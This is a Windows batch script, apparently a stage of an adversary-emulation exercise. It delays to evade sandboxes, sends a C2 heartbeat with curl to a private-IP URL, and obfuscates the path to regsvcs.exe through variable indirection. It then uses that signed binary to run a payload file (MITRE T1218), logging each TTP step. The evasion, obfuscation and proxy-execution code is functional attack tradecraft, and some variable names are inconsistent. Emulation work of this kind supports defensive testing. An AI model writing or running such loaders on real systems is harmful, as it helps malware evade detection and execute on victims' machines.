@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder constants (plain literals - NEVER obfuscated)
SET txisnba=%APPDATA%\8491\32cafbcc
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8491-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=mspaint.txt
SET dvhhyc=8491

REM Obfuscated variable names for internal use
SET zhvfg=a
SET qwerty=b
SET mxncbv=c
SET plmkoi=d
SET vbnght=e
SET xswzaq=f
SET yhnujm=g
SET okiopl=h
SET lkjhgf=i
SET mnbvcx=j
SET qazxsw=k
SET edcrfv=l

REM Debug logging file path
SET mkjhgb=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial sandbox evasion delay (30-60s)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=>> "!mjkhgb!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete=>> "!mjkhgb!" 2>nul

REM Layer 1: Heartbeat to C2 (CRITICAL: do not modify URL)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=>> "!mjkhgb!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=>> "!mjkhgb!" 2>nul

REM Random delay between operations
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: ping_delay_complete=>> "!mjkhgb!" 2>nul

REM Obfuscate regsvcs.exe using variable indirection
SET !zhvfg!=C:\Windows\Microsoft.NET\Framework\v4.0.30319\
SET !qwerty!=reg
SET !mxncbv!=svcs
SET !plmkoi!=.exe
SET !vbnght!=!zhvfg!
SET !xswzaq!=!qwerty!
SET !yhnujm!=!mxncbv!
SET !okiopl!=!plmkoi!
CALL SET !lkjhgf!=%%!!vbnght!%%%%!!xswzaq!%%%%!!yhnujm!%%%%!!okiopl!%%

REM Layer 2: Build command parts for execution
SET !mnbvcx!=/u
SET !qazxsw!=/nologo
SET !edcrfv!=!lkjhgf!
SET command_part1=!mnbvcx!
SET command_part2=!qazxsw!
SET command_runner=!edcrfv!

REM Delay before directory change
CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: choice_delay_complete=>> "!mjkhgb!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!mjkhgb!" 2>nul
cd /d "!txisnba!" 2>nul
if !errorlevel!==0 (
    SET chdir_result=success
) else (
    SET chdir_result=failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_end=!chdir_result!>> "!mjkhgb!" 2>nul

REM Random delay before execution
SET /A random_delay=%RANDOM% %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!random_delay!s>> "!mjkhgb!" 2>nul
timeout /t !random_delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete=>> "!mjkhgb!" 2>nul

REM TTP Execution: T1218 Signed Binary Proxy Execution via regsvcs.exe
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_exec_start=!xzanpex!>> "!mjkhgb!" 2>nul

REM Prepare TTP logging variables
SET result_value=1
SET error_detail=

REM Execute the .NET DLL using obfuscated command
!command_runner! "!xzanpex!" !command_part1! !command_part2!
if !errorlevel! neq 0 (
    SET result_value=0
    SET error_detail=regsvcs_failed
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_exec_failed=!errorlevel!>> "!mjkhgb!" 2>nul
) else (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_exec_success=>> "!mjkhgb!" 2>nul
)

REM Create normalized timestamp for TTP log
for /f "tokens=1-4 delims=/-. " %%a in ("!DATE!") do (
    set year=%%d
    set month=%%b
    set day=%%c
)
for /f "tokens=1-4 delims=:.," %%a in ("!TIME!") do (
    set hour=%%a
    set minute=%%b
    set second=%%c
    set millis=%%d
)
if "!hour:~0,1!"==" " set hour=0!hour:~1!
if "!hour!"=="24" set hour=00
if "!millis!"=="" set millis=000
set ttp_timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.!millis!

REM Log TTP execution
echo [!ttp_timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!result_value!:!error_detail!>> "!mjkhgb!" 2>nul

REM Final delay before exit
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete=>> "!mjkhgb!" 2>nul

ENDLOCAL
exit /b 0